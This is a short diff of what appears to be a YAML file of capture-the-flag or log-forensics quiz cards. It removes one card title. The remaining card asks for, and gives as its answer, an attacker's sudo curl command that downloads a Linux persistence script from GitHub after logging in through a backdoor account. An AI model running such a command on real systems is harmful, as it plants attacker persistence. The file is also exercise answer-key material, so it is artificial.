@@ -126,7 +126,6 @@ cards:
       [Mar 6 06:37:24] systemd-logind[411]: Removed session 37.
 
   card8:
-    card_title: "question 08"
     question: "The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?"
     answer: "/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh"
     explanation: |
